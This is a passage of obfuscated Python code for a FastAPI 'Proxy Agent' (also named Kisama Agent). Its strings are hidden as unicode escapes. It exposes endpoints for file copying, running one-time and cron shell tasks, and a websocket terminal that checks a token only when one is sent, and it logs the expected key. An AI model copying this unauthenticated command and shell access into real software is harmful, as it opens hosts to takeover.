async def O0_fn_41(request: Request, copy_map: Dict[str, str]=Body(..., description=codecs.decode('\\u6e90\\u8def\\u5f84\\u5230\\u76ee\\u6807\\u8def\\u5f84\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')}])):
    if not copy_map:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0074\\u0020\\u006c\\u0065\\u0061\\u0073\\u0074\\u0020\\u006f\\u006e\\u0065\\u0020\\u0073\\u0072\\u0063\\u002d\\u003e\\u0064\\u0073\\u0074\\u0020\\u0070\\u0061\\u0069\\u0072\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_876 = request.app.state.file_manager
    O0_var_877 = O0_var_876.copy_paths(copy_map)
    return O0_var_877

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u006e\\u0065\\u0077', 'unicode_escape'), response_model=FileMkdirResponse)
async def O0_fn_42(request: Request, body: FileMkdirRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape')})
    O0_var_878 = request.app.state.file_manager
    O0_var_879 = O0_var_878.create_directory(body.path)
    return O0_var_879

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=OneTimeTaskGetResponse)
async def O0_fn_43(request: Request):
    O0_var_880 = request.app.state.task_manager.get_onetime_tasks()
    return O0_var_880

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=OneTimeTaskResponse)
async def O0_fn_44(request: Request, tasks: List[str]=Body(default=[])):
    request.app.state.task_manager.set_onetime_tasks(tasks)
    O0_var_881 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(tasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): tasks}
    if Config.InitTask and tasks:
        O0_var_881[codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape')] = request.app.state.task_manager.run_onetime_tasks()
    return O0_var_881

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=CronTasksResponse)
async def O0_fn_45(request: Request):
    O0_var_882 = request.app.state.task_manager.get_cron_tasks()
    return O0_var_882

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=CronTasksResponse)
async def O0_fn_46(request: Request, tasks: Dict[str, str]=Body(default={}, examples=[{codecs.decode('\\u002a\\u002f\\u0031\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape'): codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068\\u005f\\u0063\\u0068\\u0065\\u0063\\u006b\\u002e\\u0070\\u0079', 'unicode_escape'), codecs.decode('\\u0030\\u0020\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u0030', 'unicode_escape'): codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0077\\u0065\\u0065\\u006b\\u006c\\u0079\\u005f\\u0072\\u0065\\u0070\\u006f\\u0072\\u0074\\u002e\\u0073\\u0068', 'unicode_escape')}])):
    O0_var_883 = request.app.state.task_manager.set_cron_tasks(tasks)
    return O0_var_883

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), response_model=TaskStatusResponse)
async def O0_fn_47(request: Request):
    return request.app.state.task_manager.get_status()

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u002f\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065', 'unicode_escape'), response_model=OnetimeExecuteResponse)
async def O0_fn_48(request: Request):
    if not Config.onetasks:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0020\\u0074\\u0061\\u0073\\u006b\\u0073\\u0020\\u0074\\u006f\\u0020\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []}
    Config.InitTask = True
    O0_var_884 = request.app.state.task_manager.run_onetime_tasks()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape'): len(O0_var_884), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_884}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=TaskLogResponse)
async def O0_fn_49(request: Request, limit: int=Query(100, ge=1, le=100)):
    O0_var_885 = request.app.state.task_manager.get_onetime_log(limit)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_885), codecs.decode('\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): list(O0_var_885)}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=TaskLogResponse)
async def O0_fn_50(request: Request, limit: int=Query(100, ge=1, le=100)):
    O0_var_886 = request.app.state.task_manager.get_cron_log(limit)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_886), codecs.decode('\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): list(O0_var_886)}

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=LogClearResponse)
async def O0_fn_51(request: Request):
    return request.app.state.task_manager.clear_logs(codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=LogClearResponse)
async def O0_fn_52(request: Request):
    return request.app.state.task_manager.clear_logs(codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'))

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0073\\u0075\\u006d\\u006d\\u0061\\u0072\\u0079', 'unicode_escape'), response_model=LogSummaryResponse)
async def O0_fn_53(request: Request):

    def O0_fn_54(O0_var_887):
        O0_var_888 = list(O0_var_887)[-10:]
        return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u006c\\u006f\\u0067\\u0067\\u0065\\u0064', 'unicode_escape'): len(O0_var_887), codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0063\\u0061\\u0070\\u0061\\u0063\\u0069\\u0074\\u0079', 'unicode_escape'): Config.MAX_TASK_LOG_SIZE, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u006e\\u0074\\u005f\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): sum((1 for O0_var_889 in O0_var_888 if O0_var_889.get(codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape')) == 0)), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u006e\\u0074\\u005f\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'): sum((1 for O0_var_890 in O0_var_888 if O0_var_890.get(codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'), -1) != 0))}
    return {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): O0_fn_54(Config.onetimetasks_log), codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): O0_fn_54(Config.crontasks_log)}

@app.get(codecs.decode('\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'))
async def O0_fn_55():
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067', 'unicode_escape'): Config.DEBUG, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'): int(time.time()), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION}

@app.get(codecs.decode('\\u002f', 'unicode_escape'))
async def O0_fn_56():
    return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0050\\u0072\\u006f\\u0078\\u0079\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0065\\u006e\\u0064\\u0070\\u006f\\u0069\\u006e\\u0074\\u0073', 'unicode_escape'): {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'): codecs.decode('\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0064\\u006f\\u0063\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u0073\\u0020\\u0028\\u4ec5\\u0044\\u0045\\u0042\\u0055\\u0047\\u6a21\\u5f0f\\u0029', 'unicode_escape')}}

@app.websocket(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0077\\u0073\\u002f\\u007b\\u0070\\u0061\\u0074\\u0068\\u003a\\u0070\\u0061\\u0074\\u0068\\u007d', 'unicode_escape'))
async def O0_fn_57(websocket: WebSocket, path: str, request_id: str=Query(...), token: str=Query(None)):
    O0_var_891 = TerminalSessionHandler()
    O0_var_892 = True
    if token is not None:
        O0_var_892 = False
        O0_var_893 = Config.keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].public_b64
        Logger.debug(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u005f\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape') + str(O0_var_893))
        Logger.debug(codecs.decode('\\u0074\\u006f\\u006b\\u0065\\u006e\\u003a', 'unicode_escape') + str(token))
        if token != O0_var_893:
            await websocket.close(code=1008, reason=codecs.decode('\\u0041\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'))
            Logger.warning(codecs.decode('\\U0001f6a8\\u0020\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(request_id) + codecs.decode('\\u005d\\u0020\\u8ba4\\u8bc1\\u5931\\u8d25\\uff0c\\u975e\\u6cd5\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e\\uff01', 'unicode_escape'))
            return
        Logger.info(codecs.decode('\\u2705\\u0020\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(request_id) + codecs.decode('\\u005d\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e\\u0020\\u8ba4\\u8bc1\\u901a\\u8fc7\\u0020\\u0028\\u0048\\u0054\\u0054\\u0050\\u0053\\u0020\\u964d\\u7ea7\\u6a21\\u5f0f\\u0029', 'unicode_escape'))
    await O0_var_891.start_session(websocket, request_id, O0_var_892)

@app.exception_handler(HTTPException)
async def O0_fn_58(request: Request, exc: HTTPException):
    O0_var_894 = {codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): exc.detail, codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): exc.status_code}
    return JSONResponse(status_code=exc.status_code, content=O0_var_894)

class NoSignalsUvicornServer(uvicorn.Server):
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u81ea\\u5b9a\\u4e49\\u0020\\u0055\\u0076\\u0069\\u0063\\u006f\\u0072\\u006e\\u0020\\u670d\\u52a1\\u5668\\u7c7b\\u000a\\u0020\\u0020\\u0020\\u0020\\U0001f31f\\u0020\\u6838\\u5fc3\\u6280\\u5de7\\uff1a\\u91cd\\u5199\\u4fe1\\u53f7\\u5b89\\u88c5\\u51fd\\u6570\\u3002\\u76f4\\u63a5\\u0020\\u0070\\u0061\\u0073\\u0073\\u0020\\u6389\\uff0c\\u963b\\u6b62\\u0020\\u0055\\u0076\\u0069\\u0063\\u006f\\u0072\\u006e\\u0020\\u5c1d\\u8bd5\\u5728\\u5b50\\u7ebf\\u7a0b\\u000a\\u0020\\u0020\\u0020\\u0020\\u6ce8\\u518c\\u4e3b\\u7ebf\\u7a0b\\u4e13\\u7528\\u7684\\u7cfb\\u7edf\\u4fe1\\u53f7\\uff08\\u89e3\\u51b3\\u0020\\u0056\\u0061\\u006c\\u0075\\u0065\\u0045\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020\\u0073\\u0065\\u0074\\u005f\\u0077\\u0061\\u006b\\u0065\\u0075\\u0070\\u005f\\u0066\\u0064\\u0020\\u006f\\u006e\\u006c\\u0079\\u0020\\u0077\\u006f\\u0072\\u006b\\u0073\\u0020\\u0069\\u006e\\u0020\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\uff09\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def install_signal_handlers(self) -> None:
        pass

def _start_uvicorn_server(O0_var_895, host, port, log_level):
    O0_var_896 = asyncio.new_event_loop()
    asyncio.set_event_loop(O0_var_896)
    O0_var_897 = uvicorn.Config(app=O0_var_895, host=host, port=port, reload=False, log_level=log_level)
    O0_var_898 = NoSignalsUvicornServer(O0_var_897)
    O0_var_898.run()

def O0_fn_59(blocking: bool=False):
    Config.validate()
    O0_fn_1()
    O0_var_899 = codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067', 'unicode_escape') if Config.DEBUG else codecs.decode('\\u0069\\u006e\\u0066\\u006f', 'unicode_escape')
    if Config.DEBUG:
        Logger.warning(codecs.decode('\\u26a0\\ufe0f\\u0020\\u5f53\\u524d\\u5904\\u4e8e\\u0020\\u0044\\u0045\\u0042\\u0055\\u0047\\u0020\\u6a21\\u5f0f\\uff0c\\u4f46\\u7531\\u4e8e\\u91c7\\u7528\\u4e86\\u975e\\u963b\\u585e\\u540e\\u53f0\\u6302\\u8f7d\\uff0c\\u5df2\\u81ea\\u52a8\\u5173\\u95ed\\u70ed\\u91cd\\u8f7d\\u0028\\u0052\\u0065\\u006c\\u006f\\u0061\\u0064\\u0029\\u529f\\u80fd\\u3002', 'unicode_escape'))
    Logger.info(codecs.decode('\\u0020\\U0001f680\\u0020\\u004b\\u0069\\u0073\\u0061\\u006d\\u0061\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u5f00\\u59cb\\u5728\\u540e\\u53f0\\u5b88\\u62a4\\u7ebf\\u7a0b\\u4e2d\\u542f\\u52a8\\u002e\\u002e\\u002e', 'unicode_escape'))
    O0_var_900 = threading.Thread(target=_start_uvicorn_server, args=(app, Config.HOST, Config.PORT, O0_var_899), daemon=True)
    O0_var_900.start()
    Logger.info(codecs.decode('\\u0020\\u005b\\u002d\\u005d\\u0020\\u540e\\u53f0\\u670d\\u52a1\\u5df2\\u6210\\u529f\\u6302\\u8f7d\\uff0c\\u6b63\\u5728\\u76d1\\u542c\\u7aef\\u53e3\\u003a\\u0020', 'unicode_escape') + str(Config.PORT))
    if blocking:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            Logger.info(codecs.decode('\\U0001f6d1\\u0020\\u6536\\u5230\\u7ec8\\u6b62\\u4fe1\\u53f7\\uff0c\\u004b\\u0069\\u0073\\u0061\\u006d\\u0061\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u5b88\\u62a4\\u8fdb\\u7a0b\\u5df2\\u5b89\\u5168\\u9000\\u51fa\\u3002', 'unicode_escape'))

def cli():
    O0_fn_59(blocking=True)
if __name__ == codecs.decode('\\u005f\\u005f\\u006d\\u0061\\u0069\\u006e\\u005f\\u005f', 'unicode_escape'):
    cli()